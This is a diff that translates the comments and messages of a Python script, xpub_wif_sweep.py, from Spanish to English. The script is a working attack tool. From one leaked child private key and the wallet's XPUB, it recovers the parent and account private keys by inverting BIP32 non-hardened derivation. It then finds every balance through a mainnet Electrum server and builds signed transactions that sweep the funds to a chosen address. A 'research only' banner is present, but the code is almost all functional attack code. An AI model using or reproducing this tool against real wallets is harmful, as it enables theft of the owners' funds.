@@ -1,12 +1,12 @@
 #!/usr/bin/env python3
 """
-xpub_wif_sweep.py — Demostración de vulnerabilidad BIP32 non-hardened.
+xpub_wif_sweep.py — Demonstration of the BIP32 non-hardened derivation vulnerability.
 
-Si un atacante tiene el WIF de CUALQUIER dirección derivada de un XPUB, puede
-recuperar el extended private key padre y barrer TODOS los fondos del árbol.
+If an attacker has the WIF of ANY address derived from an XPUB, they can
+recover the parent extended private key and sweep ALL funds from the tree.
 
-ADVERTENCIA: Solo para investigación de seguridad y entornos de prueba.
-NO hacer broadcast sin autorización del propietario del wallet.
+WARNING: For security research and test environments only.
+DO NOT broadcast without authorization from the wallet owner.
 """
 
 import hashlib
@@ -20,7 +20,7 @@ import sys
 from dataclasses import dataclass, field
 from typing import Optional
 
-# ─── Constantes secp256k1 ─────────────────────────────────────────────────────
+# ─── secp256k1 constants ──────────────────────────────────────────────────────
 
 SECP256K1_N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
 SECP256K1_P = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F
@@ -42,21 +42,21 @@ XPUB_VERSION_BYTES = {
 }
 
 
-# ─── Primitivas criptográficas ────────────────────────────────────────────────
+# ─── Cryptographic primitives ─────────────────────────────────────────────────
 
 def dsha256(data: bytes) -> bytes:
     return hashlib.sha256(hashlib.sha256(data).digest()).digest()
 
 
 def _ripemd160(data: bytes) -> bytes:
-    """RIPEMD-160 puro en Python (para entornos con OpenSSL 3.0+ que deshabilita RIPEMD160)."""
-    # Intentar vía hashlib primero (más rápido)
+    """Pure-Python RIPEMD-160 (for environments with OpenSSL 3.0+ that disables RIPEMD160)."""
+    # Try via hashlib first (faster)
     for kwargs in [{}, {"usedforsecurity": False}]:
         try:
             return hashlib.new("ripemd160", data, **kwargs).digest()
         except (ValueError, TypeError):
             pass
-    # Implementación pura RIPEMD-160
+    # Pure RIPEMD-160 implementation
     KL = [0x00000000, 0x5A827999, 0x6ED9EBA1, 0x8F1BBCDC, 0xA953FD4E]
     KR = [0x50A28BE6, 0x5C4DD124, 0x6D703EF3, 0x7A6D76E9, 0x00000000]
     RL = [
@@ -137,17 +137,17 @@ def hmac_sha512(key: bytes, data: bytes) -> bytes:
 
 
 def base58check_decode(s: str) -> bytes:
-    """Decodifica Base58Check → payload (sin checksum)."""
+    """Decode Base58Check → payload (without checksum)."""
     n = 0
     for c in s.encode():
         n = n * 58 + BASE58_ALPHABET.index(c)
     result = n.to_bytes(82, "big").lstrip(b"\x00")
-    # Prefijo de ceros
+    # Leading zero bytes
     leading = len(s) - len(s.lstrip("1"))
     result = b"\x00" * leading + result
     payload, checksum = result[:-4], result[-4:]
     if dsha256(payload)[:4] != checksum:
-        raise ValueError("Checksum Base58Check inválido")
+        raise ValueError("Invalid Base58Check checksum")
     return payload
 
 
@@ -164,7 +164,7 @@ def base58check_encode(payload: bytes) -> str:
     return (b"1" * leading + b"".join(result)).decode()
 
 
-# ─── Aritmética de curva elíptica secp256k1 ───────────────────────────────────
+# ─── secp256k1 elliptic curve arithmetic ──────────────────────────────────────
 
 def _mod_inv(a: int, m: int) -> int:
     return pow(a, m - 2, m)
@@ -200,7 +200,7 @@ def _point_mul(k: int, P=None) -> tuple:
 
 
 def privkey_to_pubkey(privkey: bytes) -> bytes:
-    """Clave privada (32 bytes) → pubkey comprimida (33 bytes)."""
+    """Private key (32 bytes) → compressed pubkey (33 bytes)."""
     k = int.from_bytes(privkey, "big")
     x, y = _point_mul(k)
     prefix = b"\x02" if y % 2 == 0 else b"\x03"
@@ -208,7 +208,7 @@ def privkey_to_pubkey(privkey: bytes) -> bytes:
 
 
 def pubkey_from_compressed(pubkey33: bytes) -> tuple:
-    """Pubkey comprimida → punto (x, y)."""
+    """Compressed pubkey → point (x, y)."""
     prefix = pubkey33[0]
     x = int.from_bytes(pubkey33[1:], "big")
     y_sq = (pow(x, 3, SECP256K1_P) + 7) % SECP256K1_P
@@ -227,18 +227,18 @@ class XPubInfo:
     parent_fingerprint: bytes
     child_index: int
     chain_code: bytes
-    pubkey: bytes  # 33 bytes comprimida
-    network: str   # "mainnet" o "testnet"
+    pubkey: bytes  # 33 bytes compressed
+    network: str   # "mainnet" or "testnet"
 
 
 def parse_xpub(xpub_str: str) -> XPubInfo:
     raw = base58check_decode(xpub_str)
     if len(raw) != 78:
-        raise ValueError(f"XPUB tiene longitud inesperada: {len(raw)}")
+        raise ValueError(f"XPUB has unexpected length: {len(raw)}")
     version = raw[:4]
     network = XPUB_VERSION_BYTES.get(version)
     if network is None:
-        raise ValueError(f"Versión de XPUB no reconocida: {version.hex()}")
+        raise ValueError(f"Unrecognized XPUB version: {version.hex()}")
     depth = raw[4]
     parent_fp = raw[5:9]
     child_idx = struct.unpack(">I", raw[9:13])[0]
@@ -251,30 +251,30 @@ def parse_wif(wif_str: str) -> tuple[bytes, bool]:
     """WIF → (privkey_32_bytes, compressed)."""
     raw = base58check_decode(wif_str)
     if raw[0] not in (0x80, 0xEF):
-        raise ValueError(f"Prefijo WIF desconocido: 0x{raw[0]:02x}")
+        raise ValueError(f"Unknown WIF prefix: 0x{raw[0]:02x}")
     if len(raw) == 34 and raw[-1] == 0x01:
         return raw[1:33], True
     elif len(raw) == 33:
         return raw[1:33], False
     else:
-        raise ValueError(f"Longitud WIF inesperada: {len(raw)}")
+        raise ValueError(f"Unexpected WIF length: {len(raw)}")
 
 
 def ckd_pub(K_par: bytes, c_par: bytes, index: int) -> tuple[bytes, bytes]:
-    """Derivación pública BIP32 non-hardened. Retorna (K_child_33, c_child_32)."""
+    """BIP32 non-hardened public derivation. Returns (K_child_33, c_child_32)."""
     if index >= 0x80000000:
-        raise ValueError("ckd_pub no soporta índices hardened")
+        raise ValueError("ckd_pub does not support hardened indexes")
     I = hmac_sha512(c_par, K_par + struct.pack(">I", index))
     IL, IR = I[:32], I[32:]
     IL_int = int.from_bytes(IL, "big")
     if IL_int >= SECP256K1_N:
-        raise ValueError("IL >= n, índice inválido")
+        raise ValueError("IL >= n, invalid index")
     # K_child = point(IL) + K_par
     K_par_point = pubkey_from_compressed(K_par)
     IL_point = _point_mul(IL_int)
     K_child_point = _point_add(IL_point, K_par_point)
     if K_child_point is None:
-        raise ValueError("Punto en el infinito, índice inválido")
+        raise ValueError("Point at infinity, invalid index")
     x, y = K_child_point
     prefix = b"\x02" if y % 2 == 0 else b"\x03"
     K_child = prefix + x.to_bytes(32, "big")
@@ -282,7 +282,7 @@ def ckd_pub(K_par: bytes, c_par: bytes, index: int) -> tuple[bytes, bytes]:
 
 
 def ckd_priv(k_par: bytes, c_par: bytes, index: int) -> tuple[bytes, bytes]:
-    """Derivación privada BIP32. Retorna (k_child_32, c_child_32)."""
+    """BIP32 private derivation. Returns (k_child_32, c_child_32)."""
     K_par = privkey_to_pubkey(k_par)
     if index >= 0x80000000:
         data = b"\x00" + k_par + struct.pack(">I", index)
@@ -294,32 +294,32 @@ def ckd_priv(k_par: bytes, c_par: bytes, index: int) -> tuple[bytes, bytes]:
     k_par_int = int.from_bytes(k_par, "big")
     k_child_int = (IL_int + k_par_int) % SECP256K1_N
     if k_child_int == 0:
-        raise ValueError("k_child == 0, índice inválido")
+        raise ValueError("k_child == 0, invalid index")
     return k_child_int.to_bytes(32, "big"), IR
 
 
 def recover_parent_privkey(k_child: bytes, K_parent: bytes, c_parent: bytes, index: int) -> bytes:
     """
-    Operación central de la vulnerabilidad BIP32 non-hardened:
-    Dado k_child = k_parent + HMAC(c_parent || K_parent || i)[0:32]
-    Recupera k_parent = k_child - IL  (mod n)
+    Core operation of the BIP32 non-hardened vulnerability:
+    Given k_child = k_parent + HMAC(c_parent || K_parent || i)[0:32]
+    Recover k_parent = k_child - IL  (mod n)
     """
     I = hmac_sha512(c_parent, K_parent + struct.pack(">I", index))
     IL_int = int.from_bytes(I[:32], "big")
     k_child_int = int.from_bytes(k_child, "big")
     k_parent_int = (k_child_int - IL_int) % SECP256K1_N
     k_parent = k_parent_int.to_bytes(32, "big")
-    # Verificación: el punto resultante debe coincidir con K_parent
+    # Verify: the recovered point must match K_parent
     recovered_pub = privkey_to_pubkey(k_parent)
     if recovered_pub != K_parent:
         raise ValueError(
-            "Verificación fallida: la pubkey recuperada no coincide con K_parent.\n"
-            "Asegúrate de que el WIF corresponde al XPUB proporcionado."
+            "Verification failed: recovered pubkey does not match K_parent.\n"
+            "Make sure the WIF corresponds to the provided XPUB."
         )
     return k_parent
 
 
-# ─── Direcciones ──────────────────────────────────────────────────────────────
+# ─── Addresses ────────────────────────────────────────────────────────────────
 
 def pubkey_to_p2wpkh_spk(pubkey33: bytes) -> bytes:
     """P2WPKH scriptPubKey: OP_0 <hash160(pubkey)>"""
@@ -328,7 +328,7 @@ def pubkey_to_p2wpkh_spk(pubkey33: bytes) -> bytes:
 
 
 def bech32_encode(hrp: str, data: bytes) -> str:
-    """Codifica P2WPKH en bech32 (segwit v0)."""
+    """Encode P2WPKH address in bech32 (segwit v0)."""
     CHARSET = "qpzry9x8gf2tvdw0s3jn54khce6mua7l"
 
     def bech32_polymod(values):
@@ -357,8 +357,8 @@ def bech32_encode(hrp: str, data: bytes) -> str:
 
     witver = 0
     witprog = list(data)
-    enc = convertbits([witver] + witprog, 8, 5)  # witver ya es 5 bits
-    # witver como 5-bit
+    enc = convertbits([witver] + witprog, 8, 5)  # witver is already 5 bits
+    # witver as 5-bit
     data5 = [witver] + convertbits(witprog, 8, 5)
     hrp_bytes = [ord(c) for c in hrp]
     combined = hrp_bytes + [0] + data5 + [0, 0, 0, 0, 0, 0]
@@ -370,19 +370,19 @@ def bech32_encode(hrp: str, data: bytes) -> str:
 
 
 def spk_to_address(spk: bytes, network: str) -> str:
-    """P2WPKH scriptPubKey → dirección bech32."""
+    """P2WPKH scriptPubKey → bech32 address."""
     if spk[0] == 0x00 and spk[1] == 0x14:
         hrp = "bc" if network == "mainnet" else "tb"
         return bech32_encode(hrp, spk[2:])
-    raise ValueError(f"Solo P2WPKH soportado. scriptPubKey: {spk.hex()}")
+    raise ValueError(f"Only P2WPKH supported. scriptPubKey: {spk.hex()}")
 
 
 def scripthash_for_electrum(spk: bytes) -> str:
-    """Electrum script hash: SHA256(spk) invertido."""
+    """Electrum script hash: SHA256(spk) reversed."""
     return hashlib.sha256(spk).digest()[::-1].hex()
 
 
-# ─── Cliente Electrum ─────────────────────────────────────────────────────────
+# ─── Electrum client ──────────────────────────────────────────────────────────
 
 class ElectrumClient:
     def __init__(self, url: str):
@@ -405,7 +405,7 @@ class ElectrumClient:
             port = int(port)
             self._sock = socket.create_connection((host, port), timeout=20)
         else:
-            raise ValueError("electrum-url debe comenzar con ssl:// o tcp://")
+            raise ValueError("electrum-url must start with ssl:// or tcp://")
         # Handshake
         self.call("server.version", ["xpub_sweep/1.0", "1.4"])
 
@@ -416,13 +416,13 @@ class ElectrumClient:
         while True:
             chunk = self._sock.recv(4096)
             if not chunk:
-                raise ConnectionError("Conexión Electrum cerrada inesperadamente")
+                raise ConnectionError("Electrum connection closed unexpectedly")
             self._buf += chunk
             if b"\n" in self._buf:
                 line, self._buf = self._buf.split(b"\n", 1)
                 resp = json.loads(line.decode())
                 if "error" in resp and resp["error"]:
-                    raise RuntimeError(f"Error Electrum: {resp['error']}")
+                    raise RuntimeError(f"Electrum error: {resp['error']}")
                 return resp.get("result")
 
     def listunspent(self, scripthash: str) -> list:
@@ -439,7 +439,7 @@ class ElectrumClient:
             self._sock.close()
 
 
-# ─── Descubrimiento de fondos ─────────────────────────────────────────────────
+# ─── Fund discovery ───────────────────────────────────────────────────────────
 
 @dataclass
 class SweepInput:
@@ -458,15 +458,15 @@ def find_wif_index_in_xpub(
     verbose: bool = False,
 ) -> dict:
     """
-    Localiza el WIF en el árbol XPUB. Detecta automáticamente el nivel.
-    Retorna dict con: xpub_level, chain, index, parent_pubkey, parent_chain_code.
+    Locates the WIF in the XPUB tree. Automatically detects the level.
+    Returns dict with: xpub_level, chain, index, parent_pubkey, parent_chain_code.
     """
     K, c = xpub.pubkey, xpub.chain_code
 
-    # Caso A: account-level XPUB → buscar en xpub/0/i y xpub/1/i
+    # Case A: account-level XPUB → search xpub/0/i and xpub/1/i
     for chain in (0, 1):
         if verbose:
-            print(f"  Buscando en xpub/{chain}/0..{gap_limit-1}...")
+            print(f"  Searching xpub/{chain}/0..{gap_limit-1}...")
         K_chain, c_chain = ckd_pub(K, c, chain)
         for i in range(gap_limit):
             K_child, _ = ckd_pub(K_chain, c_chain, i)
@@ -479,9 +479,9 @@ def find_wif_index_in_xpub(
                     "parent_chain_code": c_chain,
                 }
 
-    # Caso B: chain-level XPUB → buscar en xpub/i directamente
+    # Case B: chain-level XPUB → search xpub/i directly
     if verbose:
-        print(f"  Buscando en xpub/0..{gap_limit-1} (chain-level)...")
+        print(f"  Searching xpub/0..{gap_limit-1} (chain-level)...")
     for i in range(gap_limit):
         K_child, _ = ckd_pub(K, c, i)
         if K_child == wif_pubkey:
@@ -494,16 +494,16 @@ def find_wif_index_in_xpub(
             }
 
     raise ValueError(
-        f"Pubkey del WIF no encontrada en el árbol del XPUB (gap_limit={gap_limit}).\n"
-        "Verifica que --wif y --xpub corresponden al mismo wallet, "
-        "o aumenta --gap-limit."
+        f"WIF pubkey not found in the XPUB tree (gap_limit={gap_limit}).\n"
+        "Verify that --wif and --xpub belong to the same wallet, "
+        "or increase --gap-limit."
     )
 
 
 def recover_keys_from_match(wif_privkey: bytes, match: dict, xpub: XPubInfo) -> tuple[bytes, bytes, bytes, bytes]:
     """
-    Recupera (k_ext_chain, c_ext_chain, k_int_chain, c_int_chain)
-    usando la inversión BIP32 a partir del match encontrado.
+    Recovers (k_ext_chain, c_ext_chain, k_int_chain, c_int_chain)
+    using the BIP32 inversion from the found match.
     """
     level = match["xpub_level"]
     k_parent_chain = recover_parent_privkey(
@@ -514,14 +514,14 @@ def recover_keys_from_match(wif_privkey: bytes, match: dict, xpub: XPubInfo) -> 
     )
 
     if level == "chain":
-        # El xpub ES la chain. Solo tenemos una chain.
+        # The xpub IS the chain. We only have one chain.
         return k_parent_chain, match["parent_chain_code"], None, None
 
-    # level == "account": k_parent_chain es la chain 0 o 1.
-    # Necesitamos el account private key para derivar la otra chain.
+    # level == "account": k_parent_chain is chain 0 or 1.
+    # We need the account private key to derive the other chain.
     found_chain = match["chain"]
 
-    # Segunda inversión: recuperar k_account desde k_chain_{found_chain}
+    # Second inversion: recover k_account from k_chain_{found_chain}
     k_account = recover_parent_privkey(
         k_parent_chain,
         xpub.pubkey,
@@ -529,7 +529,7 @@ def recover_keys_from_match(wif_privkey: bytes, match: dict, xpub: XPubInfo) -> 
         found_chain,
     )
 
-    # Derivar ambas chains desde el account
+    # Derive both chains from the account
     k_ext, c_ext = ckd_priv(k_account, xpub.chain_code, 0)
     k_int, c_int = ckd_priv(k_account, xpub.chain_code, 1)
     return k_ext, c_ext, k_int, c_int
@@ -552,8 +552,8 @@ def discover_utxos(
     gap_limit: int,
     chain_label: str,
 ) -> tuple[list[SweepInput], list[AddrBalance]]:
-    """Descubre todos los UTXOs de una chain derivando con gap limit.
-    Retorna (inputs_para_sweep, balances_por_direccion)."""
+    """Discovers all UTXOs on a chain by deriving with gap limit.
+    Returns (inputs_for_sweep, balances_per_address)."""
     inputs = []
     balances = []
     consecutive_empty = 0
@@ -590,7 +590,7 @@ def discover_utxos(
     return inputs, balances
 
 
-# ─── Construcción y firma de transacción ──────────────────────────────────────
+# ─── Transaction construction and signing ─────────────────────────────────────
 
 def encode_varint(n: int) -> bytes:
     if n < 0xfd:
@@ -604,7 +604,7 @@ def encode_varint(n: int) -> bytes:
 
 
 def estimate_fee(n_inputs: int, dest_spk: bytes, fee_rate_sat_vb: float) -> int:
-    """Estimación de fee para N inputs P2WPKH y 1 output."""
+    """Fee estimate for N P2WPKH inputs and 1 output."""
     overhead = 10.5  # segwit overhead
     per_input = 68.0  # P2WPKH input vbytes
     output_vb = 9 + len(dest_spk)
@@ -620,7 +620,7 @@ def build_sighash_bip143(
     nversion: int,
     nlocktime: int,
 ) -> bytes:
-    """Calcula el BIP143 sighash para un input P2WPKH."""
+    """Compute the BIP143 sighash for a P2WPKH input."""
     inp = inputs[input_index]
 
     # hashPrevouts
@@ -636,7 +636,7 @@ def build_sighash_bip143(
     # hashOutputs
     hash_outputs = dsha256(outputs_serialized)
 
-    # scriptCode para P2WPKH
+    # scriptCode for P2WPKH
     h160 = hash160(inp.pubkey)
     scriptcode = bytes([0x19, 0x76, 0xa9, 0x14]) + h160 + bytes([0x88, 0xac])
 
@@ -656,8 +656,8 @@ def build_sighash_bip143(
 
 
 def sign_ecdsa(privkey: bytes, msg_hash: bytes) -> bytes:
-    """Firma ECDSA determinística (RFC 6979 simplificado via Python). Retorna DER + SIGHASH_ALL."""
-    # Usamos coincurve si está disponible, sino implementación pura
+    """Deterministic ECDSA signature (RFC 6979 via Python). Returns DER + SIGHASH_ALL."""
+    # Use coincurve if available, fall back to pure implementation
     try:
         import coincurve
         key = coincurve.PrivateKey(privkey)
@@ -666,7 +666,7 @@ def sign_ecdsa(privkey: bytes, msg_hash: bytes) -> bytes:
     except ImportError:
         pass
 
-    # Implementación pura RFC 6979 (deterministic k)
+    # Pure RFC 6979 implementation (deterministic k)
     def bits2int(b):
         v = int.from_bytes(b, "big")
         vlen = len(b) * 8
@@ -699,22 +699,22 @@ def sign_ecdsa(privkey: bytes, msg_hash: bytes) -> bytes:
         K = hmac.new(K, V + b"\x00", hashlib.sha256).digest()
         V = hmac.new(K, V, hashlib.sha256).digest()
 
-    # Firma ECDSA
+    # ECDSA signature
     Rx, _ = _point_mul(k_int)
     r = Rx % SECP256K1_N
     if r == 0:
-        raise ValueError("r == 0 en firma ECDSA")
+        raise ValueError("r == 0 in ECDSA signature")
     z = int.from_bytes(msg_hash, "big")
     k_inv = pow(k_int, SECP256K1_N - 2, SECP256K1_N)
     d = int.from_bytes(privkey, "big")
     s = (k_inv * (z + r * d)) % SECP256K1_N
     if s == 0:
-        raise ValueError("s == 0 en firma ECDSA")
-    # Normalizar s (BIP146)
+        raise ValueError("s == 0 in ECDSA signature")
+    # Normalize s (BIP146)
     if s > SECP256K1_N // 2:
         s = SECP256K1_N - s
 
-    # Codificar en DER
+    # DER encode
     def encode_der_int(n):
         b = n.to_bytes(32, "big").lstrip(b"\x00")
         if b[0] & 0x80:
@@ -728,7 +728,7 @@ def sign_ecdsa(privkey: bytes, msg_hash: bytes) -> bytes:
 
 
 def serialize_tx(inputs: list[SweepInput], output_spk: bytes, output_value: int, witnesses: list[list[bytes]]) -> bytes:
-    """Serializa una transacción segwit (BIP141)."""
+    """Serialize a segwit transaction (BIP141)."""
     SEQUENCE = 0xFFFFFFFD  # RBF
     NVERSION = 2
     NLOCKTIME = 0
@@ -742,7 +742,7 @@ def serialize_tx(inputs: list[SweepInput], output_spk: bytes, output_value: int,
     for inp in inputs:
         out += bytes.fromhex(inp.txid)[::-1]
         out += struct.pack("<I", inp.vout)
-        out += b"\x00"  # scriptSig vacío (P2WPKH)
+        out += b"\x00"  # empty scriptSig (P2WPKH)
         out += struct.pack("<I", SEQUENCE)
     # Outputs
     out += encode_varint(1)
@@ -760,7 +760,7 @@ def serialize_tx(inputs: list[SweepInput], output_spk: bytes, output_value: int,
 
 
 def compute_txid(inputs: list[SweepInput], output_spk: bytes, output_value: int) -> str:
-    """TXID se calcula sobre la serialización legacy (sin witness)."""
+    """TXID is computed over the legacy serialization (without witness)."""
     SEQUENCE = 0xFFFFFFFD
     NVERSION = 2
     NLOCKTIME = 0
@@ -780,10 +780,10 @@ def compute_txid(inputs: list[SweepInput], output_spk: bytes, output_value: int)
     return dsha256(out)[::-1].hex()
 
 
-# ─── Parseo de dirección destino → scriptPubKey ───────────────────────────────
+# ─── Destination address → scriptPubKey ──────────────────────────────────────
 
 def address_to_spk(address: str) -> bytes:
-    """Dirección bech32/base58 → scriptPubKey."""
+    """bech32/base58 address → scriptPubKey."""
     # P2PKH / P2SH (base58)
     if address[0] in ("1", "3", "m", "n", "2"):
         raw = base58check_decode(address)
@@ -792,18 +792,18 @@ def address_to_spk(address: str) -> bytes:
             return b"\x76\xa9\x14" + h + b"\x88\xac"
         elif version in (0x05, 0xc4):  # P2SH mainnet/testnet
             return b"\xa9\x14" + h + b"\x87"
-        raise ValueError(f"Versión base58 no reconocida: {version}")
+        raise ValueError(f"Unrecognized base58 version: {version}")
     # P2WPKH / P2WSH (bech32)
     if address.startswith(("bc1", "tb1", "bcrt1")):
-        # Decodificación bech32 simplificada para P2WPKH (20 bytes)
+        # Simplified bech32 decoding for P2WPKH (20 bytes)
         CHARSET = "qpzry9x8gf2tvdw0s3jn54khce6mua7l"
         addr = address.lower()
         pos = addr.rfind("1")
         hrp = addr[:pos]
         data = [CHARSET.index(c) for c in addr[pos+1:]]
-        # Convertir de 5-bit a 8-bit
+        # Convert from 5-bit to 8-bit
         acc, bits, result = 0, 0, []
-        for val in data[1:-6]:  # skip witver y checksum
+        for val in data[1:-6]:  # skip witver and checksum
             acc = ((acc << 5) | val) & 0xfff
             bits += 5
             if bits >= 8:
@@ -815,14 +815,14 @@ def address_to_spk(address: str) -> bytes:
             return b"\x00\x14" + witprog
         elif witver == 0 and len(witprog) == 32:
             return b"\x00\x20" + witprog
-        raise ValueError(f"Programa witness no reconocido: ver={witver}, len={len(witprog)}")
-    raise ValueError(f"Formato de dirección no reconocido: {address}")
+        raise ValueError(f"Unrecognized witness program: ver={witver}, len={len(witprog)}")
+    raise ValueError(f"Unrecognized address format: {address}")
 
 
-# ─── Helpers interactivos ─────────────────────────────────────────────────────
+# ─── Interactive helpers ───────────────────────────────────────────────────────
 
 def ask(prompt: str, default: str = "") -> str:
-    """Pide input con prompt. Si hay default lo muestra entre corchetes."""
+    """Prompt for input. Shows default in brackets if provided."""
     if default:
         display = f"{prompt} [{default}]: "
     else:
@@ -833,7 +833,7 @@ def ask(prompt: str, default: str = "") -> str:
             return val
         if default:
             return default
-        print("  (requerido)")
+        print("  (required)")
 
 
 def ask_float(prompt: str, default: float) -> float:
@@ -842,7 +842,7 @@ def ask_float(prompt: str, default: float) -> float:
         try:
             return float(raw)
         except ValueError:
-            print("  Introduce un número decimal válido.")
+            print("  Enter a valid decimal number.")
 
 
 def ask_int(prompt: str, default: int) -> int:
@@ -851,7 +851,7 @@ def ask_int(prompt: str, default: int) -> int:
         try:
             return int(raw)
         except ValueError:
-            print("  Introduce un entero válido.")
+            print("  Enter a valid integer.")
 
 
 def print_sep():
@@ -863,58 +863,58 @@ def print_sep():
 def main():
     print()
     print("╔══════════════════════════════════════════════════════════╗")
-    print("║  xpub_wif_sweep — demostración vulnerabilidad BIP32     ║")
+    print("║  xpub_wif_sweep — BIP32 vulnerability demonstration     ║")
     print("╚══════════════════════════════════════════════════════════╝")
-    print("ADVERTENCIA: solo para investigación de seguridad.")
-    print("NO hacer broadcast sin autorización del propietario.\n")
+    print("WARNING: for security research only.")
+    print("DO NOT broadcast without authorization from the wallet owner.\n")
 
-    # ── Parámetros ──────────────────────────────────────────────
+    # ── Parameters ──────────────────────────────────────────────
     print_sep()
-    print("PARÁMETROS")
+    print("PARAMETERS")
     print_sep()
-    wif_str      = ask("WIF (clave privada de cualquier dirección del wallet)")
-    xpub_str     = ask("XPUB (account-level o chain-level)")
-    destination  = ask("Dirección destino del sweep")
+    wif_str      = ask("WIF (private key of any address in the wallet)")
+    xpub_str     = ask("XPUB (account-level or chain-level)")
+    destination  = ask("Destination address for the sweep")
     electrum_url = ask("Electrum URL", "ssl://electrum.blockstream.info:50002")
-    network      = ask("Red (mainnet/testnet/signet)", "mainnet")
+    network      = ask("Network (mainnet/testnet/signet)", "mainnet")
     fee_rate     = ask_float("Fee rate (sat/vB)", 5.0)
     gap_limit    = ask_int("Gap limit", 50)
 
-    # ── Validar y parsear ────────────────────────────────────────
+    # ── Validate and parse ───────────────────────────────────────
     print()
     print_sep()
-    print("VALIDANDO INPUTS")
+    print("VALIDATING INPUTS")
     print_sep()
 
     try:
         xpub = parse_xpub(xpub_str)
     except Exception as e:
-        print(f"[!] XPUB inválido: {e}")
+        print(f"[!] Invalid XPUB: {e}")
         sys.exit(1)
-    print(f"  XPUB network detectado: {xpub.network}")
+    print(f"  Detected XPUB network: {xpub.network}")
 
     try:
         wif_privkey, compressed = parse_wif(wif_str)
     except Exception as e:
-        print(f"[!] WIF inválido: {e}")
+        print(f"[!] Invalid WIF: {e}")
         sys.exit(1)
     if not compressed:
-        print("  [!] WIF no comprimido — P2WPKH podría no coincidir")
+        print("  [!] Uncompressed WIF — P2WPKH may not match")
 
     try:
         dest_spk = address_to_spk(destination)
     except Exception as e:
-        print(f"[!] Dirección destino inválida: {e}")
+        print(f"[!] Invalid destination address: {e}")
         sys.exit(1)
-    print(f"  Dirección destino: {destination}")
+    print(f"  Destination address: {destination}")
     print(f"  Fee rate: {fee_rate} sat/vB  |  Gap limit: {gap_limit}")
 
     wif_pubkey = privkey_to_pubkey(wif_privkey)
 
-    # ── Localizar WIF en el árbol ────────────────────────────────
+    # ── Locate WIF in the tree ───────────────────────────────────
     print()
     print_sep()
-    print("LOCALIZANDO WIF EN EL ÁRBOL XPUB")
+    print("LOCATING WIF IN THE XPUB TREE")
     print_sep()
 
     try:
@@ -922,12 +922,12 @@ def main():
     except ValueError as e:
         print(f"[!] {e}")
         sys.exit(1)
-    print(f"  Nivel: {match['xpub_level']}  |  Chain: {match['chain']}  |  Índice: {match['index']}")
+    print(f"  Level: {match['xpub_level']}  |  Chain: {match['chain']}  |  Index: {match['index']}")
 
-    # ── Recuperar claves ─────────────────────────────────────────
+    # ── Recover keys ─────────────────────────────────────────────
     print()
     print_sep()
-    print("RECUPERANDO CLAVES PRIVADAS")
+    print("RECOVERING PRIVATE KEYS")
     print_sep()
 
     try:
@@ -937,59 +937,59 @@ def main():
         sys.exit(1)
 
     if match["xpub_level"] == "account":
-        print("  Account private key recuperado y verificado ✓")
-        print("  Chains externa (recepción) e interna (cambio) derivadas ✓")
+        print("  Account private key recovered and verified ✓")
+        print("  External (receive) and internal (change) chains derived ✓")
     else:
-        print("  Chain private key recuperado y verificado ✓")
+        print("  Chain private key recovered and verified ✓")
 
-    # ── Conectar Electrum y descubrir UTXOs ──────────────────────
+    # ── Connect to Electrum and discover UTXOs ───────────────────
     print()
     print_sep()
-    print("DESCUBRIENDO FONDOS VÍA ELECTRUM")
+    print("DISCOVERING FUNDS VIA ELECTRUM")
     print_sep()
-    print(f"  Conectando a {electrum_url} ...")
+    print(f"  Connecting to {electrum_url} ...")
 
     try:
         electrum = ElectrumClient(electrum_url)
         electrum.connect()
     except Exception as e:
-        print(f"[!] Error conectando a Electrum: {e}")
+        print(f"[!] Error connecting to Electrum: {e}")
         sys.exit(1)
-    print("  Conectado ✓\n")
+    print("  Connected ✓\n")
 
     all_inputs: list[SweepInput] = []
     all_balances: list[AddrBalance] = []
 
     try:
         if match["xpub_level"] == "account":
-            print("  Escaneando chain externa (recepción)...")
+            print("  Scanning external chain (receive)...")
             ext_in, ext_bal = discover_utxos(k_ext, c_ext, electrum, xpub.network, gap_limit, "ext")
             all_inputs.extend(ext_in)
             all_balances.extend(ext_bal)
 
-            print("  Escaneando chain interna (cambio)...")
+            print("  Scanning internal chain (change)...")
             int_in, int_bal = discover_utxos(k_int, c_int, electrum, xpub.network, gap_limit, "int")
             all_inputs.extend(int_in)
             all_balances.extend(int_bal)
         else:
-            print("  Escaneando chain única...")
+            print("  Scanning single chain...")
             ch_in, ch_bal = discover_utxos(k_ext, c_ext, electrum, xpub.network, gap_limit, "chain")
             all_inputs.extend(ch_in)
             all_balances.extend(ch_bal)
     finally:
         electrum.close()
 
-    # ── Resumen de saldos ────────────────────────────────────────
+    # ── Balance summary ──────────────────────────────────────────
     print()
     print_sep()
-    print("SALDOS ENCONTRADOS")
+    print("BALANCES FOUND")
     print_sep()
 
     if not all_balances:
-        print("  (ninguna dirección con saldo)")
+        print("  (no addresses with balance)")
     else:
         col_w = 45
-        print(f"  {'Dirección':<{col_w}}  {'Chain/Idx':<10}  {'UTXOs':>5}  {'Saldo (sat)':>12}")
+        print(f"  {'Address':<{col_w}}  {'Chain/Idx':<10}  {'UTXOs':>5}  {'Balance (sat)':>12}")
         print(f"  {'-'*col_w}  {'-'*10}  {'-'*5}  {'-'*12}")
         for b in all_balances:
             chain_idx = f"{b.chain_label}/{b.index}"
@@ -1000,34 +1000,34 @@ def main():
     output_value = total_sat - fee
 
     print()
-    print(f"  Total UTXOs  : {len(all_inputs)}")
-    print(f"  Total saldo  : {total_sat:,} sat")
-    print(f"  Fee estimado : {fee:,} sat  ({len(all_inputs)} inputs × 68 vB + overhead, @{fee_rate} sat/vB)")
-    print(f"  A recibir    : {output_value:,} sat  →  {destination}")
+    print(f"  Total UTXOs    : {len(all_inputs)}")
+    print(f"  Total balance  : {total_sat:,} sat")
+    print(f"  Estimated fee  : {fee:,} sat  ({len(all_inputs)} inputs × 68 vB + overhead, @{fee_rate} sat/vB)")
+    print(f"  To receive     : {output_value:,} sat  →  {destination}")
 
     if not all_inputs:
         print()
-        print("  No hay fondos que barrer. Saliendo.")
+        print("  No funds to sweep. Exiting.")
         sys.exit(0)
 
     if output_value <= 0:
         print()
-        print(f"  [!] El fee ({fee:,} sat) supera el saldo ({total_sat:,} sat).")
-        print("  Reduce el fee-rate o el gap-limit y vuelve a intentarlo.")
+        print(f"  [!] Fee ({fee:,} sat) exceeds balance ({total_sat:,} sat).")
+        print("  Lower the fee-rate or gap-limit and try again.")
         sys.exit(1)
 
